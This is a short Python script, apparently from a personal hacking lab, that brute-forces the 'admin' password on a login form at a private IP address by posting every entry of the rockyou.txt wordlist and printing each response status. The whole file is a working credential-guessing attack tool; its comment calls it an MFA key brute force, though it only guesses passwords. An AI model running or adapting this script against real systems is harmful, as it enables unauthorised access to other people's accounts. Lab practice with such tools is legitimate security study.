#!/usr/bin/env python

import requests
from bs4 import BeautifulSoup
from requests.models import Response
from requests.sessions import Session


# Login with given credentials

def postLogin(client: Session, URL, page, username, password):
    loginData = dict(username=username, password=password)
    return client.post(URL+page, loginData)


def main():
    URL = 'http://192.168.37.133'
    client = requests.session()

    # Bruteforce MFA Key
    for word in open("/home/papadoxie/Hacking/tools/KaliLists/rockyou.txt"):
        try:
            # Login to refresh session
            postPage = postLogin(
                client, URL,
                page='/login',
                username='admin',
                password=word
            )

            # Print out request info
            print(f'password: {word}  STATUS: {postPage.status_code}')
            print(f'{postPage.url}\n')
        except:
            continue


# Script
if __name__ == '__main__':
    main()
